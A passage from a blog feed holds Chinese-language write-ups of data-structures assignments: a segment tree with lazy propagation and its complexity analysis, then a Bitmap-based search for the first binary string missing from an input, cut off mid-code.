punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    left <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    right <span class="token operator">=</span> <span class="token function">search</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> cnt <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> maxcnt<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> cout <span class="token operator">&lt;&lt;</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> maxcnt<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>arr</code> 中记录排序与去重后的离散化的线段端点, 那么我们假想的扩充数组的长度为 <code>maxcnt = 2 * cnt - 1</code>. 对于每一次操作给出的端点 <code>x</code>, <code>y</code>, 我们通过二分查找得到其在 <code>arr[]</code> 中的坐标 <code>left</code>, <code>right</code>, 其在扩充数组中的对应的端点为 <code>2 * left</code>, <code>2 * right</code>.</p><p>以下函数参数中的 <code>k</code>, <code>l</code>, <code>r</code> 分别代表树的编号, 编号为 <code>k</code> 的树的左端点, 编号为 <code>k</code> 的树的右端点, <code>x</code>, <code>y</code> 分别代表操作区间的左端点, 右端点.</p><h4 id="push-down操作"><a href="#push-down操作" class="headerlink" title="push_down操作"></a>push_down操作</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 39</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> ll num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+=</span> num <span class="token operator">*</span> <span class="token function">real_length</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+=</span> num<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>update()</code> 更新编号为 <code>k</code> 的树的线段和和与懒惰标记, 即此时我们不进行数据的下放, 而是以懒惰标记的形式将其暂存在 <code>label[]</code> 内.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 45</span><span class="token keyword">void</span> <span class="token function">push_down</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> label<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> label<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>push_down</code> 操作分别更新左右子树的和与懒惰标记, 并且将自身懒惰标记置零.</p><h4 id="翻牌操作"><a href="#翻牌操作" class="headerlink" title="翻牌操作"></a>翻牌操作</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 34</span>ll <span class="token function">real_length</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> ll<span class="token operator">*</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>r <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> arr<span class="token punctuation">[</span>l <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>l <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>real_length()</code> 线段树中两端点间的实际线段长度, 我们使用实际长度对 <code>tree[k]</code> 进行更新与维护.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 53</span><span class="token keyword">void</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> r <span class="token operator">||</span> y <span class="token operator">&lt;</span> l<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> l <span class="token operator">&amp;&amp;</span> y <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">update</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">push_down</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> y<span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>若 <code>add</code> 区间与子树区间不交, 直接返回;</li><li>若子树区间包含在 <code>add</code> 区间内, 直接更新当前子树的和与懒惰标记;</li><li>若子树区间与 <code>add</code> 区间相交, 那么向下递归: 若当前懒惰标记非零, 先进行懒惰标记的下放. 然后分别更新左子树 <code>tree[left_son(k)]</code> 与右子树 <code>tree[right_son(k)]</code> 的和, 最后用左右子树的和更新本身的和 <code>tree[k]</code>.</li></ul><h4 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 66</span>ll <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> r <span class="token operator">||</span> y <span class="token operator">&lt;</span> l<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> l <span class="token operator">&amp;&amp;</span> y <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">push_down</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> sum <span class="token operator">=</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> y<span class="token punctuation">)</span> sum <span class="token operator">+=</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>do_add()</code> 与 <code>do_query()</code> 在逻辑上完全相同.</p><ul><li>若 <code>query</code> 区间与子树区间不交, 直接返回;</li><li>若子树区间包含在 <code>query</code> 区间内, 直接返回当前子树的和;</li><li>若子树区间与 <code>query</code> 区间相交, 那么向下递归: 若当前懒惰标记非零, 先进行懒惰标记的下放. 然后分别查询左子树 <code>tree[left_son(k)]</code> 与右子树 <code>tree[right_son(k)]</code> 的和, 最后用左右子树的和更新本身的和 <code>tree[k]</code>.</li></ul><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>读入数据后对端点使用 <code>qsort()</code> 进行排序, 时间复杂度为 $O(mlogm)$;</p><p>对排序后的有序数组进行去重, 时间复杂度为 $O(m)$;</p><p>每次 <code>do_add()</code> 操作与 <code>do_query()</code> 操作实际上是对整树的一次扫描, 时间复杂度正比于树高 $O(logm)$, $m$ 次操作的整体时间复杂度仍为 $O(mlog(m)).</p><p>综上, 算法总体时间复杂度为 $O(mlog(m))$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>本体空间复杂度取决于操作数 <code>m</code> 带来的离散化后的端点数 <code>k</code>, 题解中使用 <code>tree[]</code> 与 <code>label[]</code> 数组模拟了一棵 <code>Segment Tree</code>, 整体需要的空间最坏情况仍为 $O(m)$.</p><p>本题中直接开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 6</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 9</span>ll tree<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 使用 tree[] 来模拟一棵线段树.</span>ll label<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 懒惰标记.</span>ll arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 对离散化的线段端点序列进行排序与去重.</span>ll operations<span class="token punctuation">[</span>MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录操作序列.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $(16 + 16 + 2 + 3)\times 2\times 10^5 \times 8B = 56MB$, 在题目要求范围内.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Not Found</title>
      <link href="/2022/11/16/not-found/"/>
      <url>/2022/11/16/not-found/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-2-Not-Found"><a href="#3-2-Not-Found" class="headerlink" title="3-2 Not Found"></a>3-2 Not Found</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>注意到 $A$ 的输入长度范围为 $[1, 2^{24}]$, 而可由 $A$ 产生的所有长度为 $n$ 的子串数为 $\vert A\vert - n + 1$. 一个长度为 $n$ 的字符串共有 $2^n$ 种可能, 当 $n  = 24$ 时, 由 $\vert A\vert - 24 + 1 &lt; 2^{24}$, $A$ 中已经无法包含所有长度为 $24$ 的子串, 因此第一个未在 $A$ 中出现的子串必是长度不超过 $24$ 的子串.</p><p>考虑枚举所有长度为 $k$ 的子串, 其中 $k \le \min(\vert A\vert, 24)$. 对于 $A$ 中长度为 $k$ 的所有子串, 我们依据其二进制值进行标记. 由于数据范围过大, 且实际上需储存的只是串的存在性, 因此考虑使用 <code>Bitmap</code> 对子串情况进行存储.</p><h4 id="class-Bitmap"><a href="#class-Bitmap" class="headerlink" title="class Bitmap"></a>class Bitmap</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 6</span><span class="token comment">// 实现一个 Bitmap 类存储 01 字符串.</span><span class="token keyword">class</span> <span class="token class-name">Bitmap</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token comment">// 所存放的空间 M[], 容量为 N * sizeof(char) * 8 bit.</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> M<span class="token punctuation">;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>      <span class="token comment">// 初始化 Bitmap, 置 0.</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        N <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>        M <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 构造函数.</span>    <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">init</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 设置 Bitmap 第 k 位为 1.</span>    <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 清除 Bitmap 第 k 位.</span>    <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 检测 Bitmap 第 k 位是否为 1.</span>    <span class="token keyword">bool</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 清零 Bitmap. </span>    <span class="token keyword">void</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">memset</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="void-read-input"><a href="#void-read-input" class="headerlink" title="void read_input()"></a>void read_input()</h4><p>在读入初始字符串时, 设置 <code>Bitmap* str</code>, 若初始字符串第 $k$ 位为 $1$, 则使用 <code>str-&gt;set[k]</code> 修改 <code>Bitmap</code> 的内容. 将输入字符串从左到右读入 <code>Bitmap* str</code>, 此时 <code>Bitmap* str</code> 存放了一个 $01$ 字符串.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 32</span><span class="token keyword">void</span> <span class="token function">read_input</span><span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">&amp;</span> input<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>input <span class="token operator">!=</span> <span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        input <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>             str<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        len<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="int-read"><a href="#int-read" class="headerlink" title="int read()"></a>int read()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 42</span><span class="token keyword">int</span> <span class="token function">read</span><span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> bitmap<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> read_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> read_len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> bitmap<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>read()</code> 从 <code>Bitmap* str</code> 第 <code>pos</code> 位开始读取为长 <code>read_len</code> 的二进制串, 并将其转换为十进制数. 为了节省遍历子串的时间, 首先考虑 $k = \min(\vert A\vert, 24)$ 的情形.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 113</span><span class="token keyword">int</span> k <span class="token operator">=</span> search_len<span class="token punctuation">;</span>Bitmap<span class="token operator">*</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> search_len<span class="token punctuation">)</span><span class="token punctuation">;</span>Bitmap<span class="token operator">*</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>search_len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Bitmap* a</code> 用于存储所有长 $k$ 位的 $01$ 串在原字符串中的出现情况, 若 <code>a-&gt;test(i) == true</code>, 则输入串中存在十进制值为 $i$ 的 $k$ 位 $01$ 二进制串. <code>Bitmap* b</code> 用于存储所有长 $k - 1$ 位的 $01$ 串在原字符串中的出现情况, 若 <code>b-&gt;test(j) == true</code>, 则输入串中存在十进制值为 $j$ 的 $k - 1$ 位 $01$ 二进制串.</p><p>从 <code>Bitmap* str</code> 的末尾开始向头部遍历, 对于当前处理的二进制串的十进制值 $s = \overline{a_{m + 1}a_{m + 2}\cdots a_{m + k}}_2$, 下一个处理串的十进制值 $s’ = \overline{a_ma_{m + 1}\cdots a_{m + k - 1}}_2 = a\gg 1 + a_m\ll (k - 1)$.</p><p>从后向前遍历, 节省了将二进制串转换为十进制串的时间.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 118</span><span class="token keyword">int</span> pos <span class="token operator">=</span> len <span class="token operator">-</span> k<span class="token punctuation">;</span><span class="token keyword">int</span> get <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>pos <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token 